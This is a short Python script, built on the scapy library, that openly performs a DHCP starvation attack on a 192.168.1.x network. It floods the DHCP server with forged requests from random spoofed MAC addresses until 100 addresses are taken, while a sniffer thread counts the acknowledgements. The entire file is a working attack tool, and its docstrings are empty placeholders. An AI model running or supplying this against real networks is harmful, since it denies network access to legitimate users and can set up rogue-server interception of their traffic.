"""Summary.

Attributes:
    ip (list): Description
    mac (list): Description
"""
from scapy.all import *
from time import sleep
from threading import Thread

mac = [""]
ip = []


def callback_dhcp_handle(pkt):
    """Summary.

    Args:
        pkt (TYPE): Description
    """
    if pkt.haslayer(DHCP):

        if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "192.168.1.38":
            ip.append(pkt[IP].dst)
            print(str(pkt[IP].dst) + " registered")
        elif pkt[DHCP].options[0][1] == 6:
            print("NAK received")


def sniff_udp_packets():
    """Summary."""
    sniff(filter="udp and (port 67 or port 68)",
          prn=callback_dhcp_handle,
          store=0)


def occupy_ip():
    """Summary."""
    for i in range(250):
        requested_addr = "192.168.1." + str(2 + i)
        if requested_addr in ip:
            continue

        src_mac = ""
        while src_mac in mac:
            src_mac = RandMAC()
        mac.append(src_mac)

        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr="\x00\x00\x00\x00\x00\x00", xid=0x10000000)
        pkt /= DHCP(options=[("message-type", "request"),
                             ("requested_addr", requested_addr),
                             ("server_id", "192.168.1.1"),
                             "end"])
        sendp(pkt)
        pkt.show()
        print("Trying to occupy " + requested_addr)
        sleep(0.2)  # interval to avoid congestion and packet loss


def main():
    """Summary."""
    thread = Thread(target=sniff_udp_packets)
    thread.start()
    print("Starting DHCP starvation...")
    # Keep starving until all 100 targets are registered
    # 100~200 excepts 107 = 100
    while len(ip) < 100:
        occupy_ip()
    print("Targeted IP address starved")

main()
